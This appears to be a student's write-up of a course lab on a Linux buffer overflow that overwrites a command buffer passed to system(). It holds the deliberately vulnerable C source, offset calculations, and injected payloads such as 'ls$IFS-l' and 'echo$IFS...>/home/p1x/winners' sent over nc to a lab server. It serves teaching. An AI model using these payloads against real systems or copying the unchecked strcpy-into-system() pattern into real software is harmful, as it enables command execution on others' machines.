#### Proj 1: Linux Buffer Overflow: Command Injection

```c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ cat buf.c
#include <string.h>
#include <stdio.h>

main(){
        char name[200];
        printf("What is your name?\n");
        scanf("%s", name);
        bo(name, "uname -a");
}

int bo(char *name, char *cmd){
        char c[40];
        char buffer[40];
        printf("Name buffer address:    %x\n", buffer);
        printf("Command buffer address: %x\n", c);
        strcpy(c, cmd);
        strcpy(buffer, name);
        printf("Goodbye, %s!\n", buffer);
        printf("Executing command: %s\n", c);
        fflush(stdout);
        system(c);
}
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ gcc -g -fno-stack-protector -z execstack -o buf buf.c
buf.c:4:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main(){
 ^~~~
buf.c: In function ‘main’:
buf.c:8:9: warning: implicit declaration of function ‘bo’ [-Wimplicit-function-declaration]
         bo(name, "uname -a");
         ^~
buf.c: In function ‘bo’:
buf.c:14:42: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘char *’ [-Wformat=]
         printf("Name buffer address:    %x\n", buffer);
                                          ^
buf.c:15:42: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘char *’ [-Wformat=]
         printf("Command buffer address: %x\n", c);
                                          ^
buf.c:21:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
         system(c);
         ^~~~~~
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ ./buf
What is your name?
Kanishka
Name buffer address:    bf99dce0
Command buffer address: bf99dd08
Goodbye, Kanishka!
Executing command: uname -a
Linux u32-VirtualBox 4.10.0-33-generic #37-Ubuntu SMP Fri Aug 11 10:53:59 UTC 2017 i686 i686 i686 GNU/Linux
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ ./buf
What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Name buffer address:    bfd10970
Command buffer address: bfd10998
Goodbye, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Executing command: AAAAAAAAAAAAAAAAAAA
sh: 1: AAAAAAAAAAAAAAAAAAA: not found
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ python
Python 2.7.13 (default, Jan 19 2017, 14:48:08)
[GCC 6.3.0 20170118] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xbfd10998-0xbfd10970
40L
>>>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ ./buf
What is your name?
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEE
Name buffer address:    bfbeb720
Command buffer address: bfbeb748
Goodbye, AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEE!
Executing command: EEEEEEEEEE
sh: 1: EEEEEEEEEE: not found
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ touch 1.txt 2.txt 3.txt
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ ./buf
What is your name?
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDls
Name buffer address:    bfb3af30
Command buffer address: bfb3af58
Goodbye, AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDls!
Executing command: ls
1.txt  2.txt  3.txt  buf  buf.c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ ./buf
What is your name?
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDls$IFS-l
Name buffer address:    bf8ea960
Command buffer address: bf8ea988
Goodbye, AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDls$IFS-l!
Executing command: ls$IFS-l
total 16
-rw-rw-r-- 1 u32 u32     0 Sep  1 09:08 1.txt
-rw-rw-r-- 1 u32 u32     0 Sep  1 09:08 2.txt
-rw-rw-r-- 1 u32 u32     0 Sep  1 09:08 3.txt
-rwxrwxr-x 1 u32 u32 10076 Sep  1 09:06 buf
-rw-rw-r-- 1 u32 u32   542 Sep  1 09:06 buf.c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ nc attack32direct.samsclass.info 1055
Welcome to the Command Injection Lab!
What is your name?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
What is your name?
Name buffer address:    bffffc80
Command buffer address: bffffca8
Goodbye, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Executing command: AAAAAAAAAAAAAAAAAAAAAAA
^C
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~$ python
Python 2.7.13 (default, Jan 19 2017, 14:48:08)
[GCC 6.3.0 20170118] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xbffffca8-0xbffffc80
40L
>>>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ nc attack32direct.samsclass.info 1055
Welcome to the Command Injection Lab!
What is your name?AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDecho$IFS"kan1shka9">/home/p1x/winners
What is your name?
Name buffer address:    bffffc80
Command buffer address: bffffca8
Goodbye, AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDecho$IFS"kan1shka9">/home/p1x/winners!
Executing command: echo$IFS"kan1shka9">/home/p1x/winners
^C
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$ nc attack32direct.samsclass.info 1055
Welcome to the Command Injection Lab!
What is your name?AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDtouch$IFS/home/p1x/updatenow
What is your name?
Name buffer address:    bffffc80
Command buffer address: bffffca8
Goodbye, AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDtouch$IFS/home/p1x/updatenow!
Executing command: touch$IFS/home/p1x/updatenow
^C
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-1$
```